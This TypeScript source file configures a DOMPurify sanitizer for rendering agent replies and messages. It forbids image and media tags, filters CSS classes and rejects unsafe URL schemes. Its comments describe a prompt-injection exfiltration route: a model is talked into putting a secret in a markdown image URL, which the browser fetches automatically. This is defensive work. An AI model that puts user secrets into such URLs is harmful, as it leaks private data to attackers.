// SPDX-License-Identifier: FSL-1.1-ALv2
import DOMPurify, { type Config } from "dompurify"

const SANITIZE_OPTIONS: Config = Object.freeze({
  ALLOWED_TAGS: [
    "strong",
    "em",
    "code",
    "a",
    "s",
    "u",
    "br",
    "pre",
    "span",
    "del",
    "p",
    "ul",
    "ol",
    "li",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "blockquote",
    "hr",
    "table",
    "thead",
    "tbody",
    "tr",
    "th",
    "td",
  ],
  ALLOWED_ATTR: ["href", "title", "class", "target", "rel", "data-mention-ref", "align"],
  // `align` is a markdown table's column alignment, as marked writes it. Not a
  // URL: without this its value is tested against ALLOWED_URI_REGEXP and dropped.
  ADD_URI_SAFE_ATTR: ["align"],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
  // NO resource ever loads from text rendered through here (agent replies, thread messages,
  // knowledge bodies, task text). A markdown image `![x](https://host/?d=<secret>)` is an
  // exfiltration channel: the browser fetches it the moment the message is drawn, carrying whatever
  // the model was talked into putting in the URL, with no click. Names are forbidden explicitly,
  // on top of the allow-list above, so adding a tag there later cannot quietly re-open it.
  FORBID_TAGS: ["img", "picture", "source", "video", "audio", "iframe", "object", "embed", "svg"],
  FORBID_ATTR: ["src", "srcset", "style"],
})

// One-time hook: force safe link attributes on all <a> elements
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A") {
    node.setAttribute("rel", "noopener noreferrer")
    node.setAttribute("target", "_blank")
  }
})

/**
 * The classes the markdown renderers themselves write: mention chips, task-list items, a code
 * block's language, the desktop's local path marks. Text rendered here is written by agents, by
 * other people and (through injected instructions) by strangers, and marked passes raw HTML
 * through: any other class would resolve against the app's own stylesheet (`fixed inset-0 z-50`)
 * and let a message draw over the UI around it. So every other class is dropped.
 */
const RENDERER_CLASS =
  /^(?:mention-pill|mention-actionable|md-task|md-task-box|md-task-done|language-[A-Za-z0-9_+#.-]{1,40}|lpmark-[A-Za-z0-9]{1,64}-\d{1,6})$/

export function keepRendererClasses(value: string): string {
  return value
    .split(/\s+/)
    .filter((c) => RENDERER_CLASS.test(c))
    .join(" ")
}

// Scoped to `sanitizeHtml` (the global DOMPurify instance also serves the mail sanitiser, whose
// own rules stand): only while this flag is up are classes filtered.
let filteringClasses = false
DOMPurify.addHook("uponSanitizeAttribute", (_node, data) => {
  if (!filteringClasses || data.attrName !== "class") return
  const kept = keepRendererClasses(data.attrValue)
  if (kept) data.attrValue = kept
  else data.keepAttr = false
})

/** Sanitize HTML for safe innerHTML rendering.
 *  This is the ONLY approved sanitization path in the frontend. */
export function sanitizeHtml(raw: string): string {
  filteringClasses = true
  try {
    return DOMPurify.sanitize(raw, SANITIZE_OPTIONS) as string
  } finally {
    filteringClasses = false
  }
}

const SAFE_USER_URL_REGEXP = /^(?:https?|mailto):/i

export function isSafeUserUrl(url: string | null | undefined): string | undefined {
  if (!url) return undefined
  // Strip leading C0 controls + whitespace before scheme check — browsers
  // do this per WHATWG URL spec, so we must mirror it to catch obfuscated
  // javascript: URLs.
  // biome-ignore lint/suspicious/noControlCharactersInRegex: intentional, see comment above
  const stripped = url.replace(/^[\s\x00-\x20]+/, "")
  if (!SAFE_USER_URL_REGEXP.test(stripped)) return undefined
  return url
}
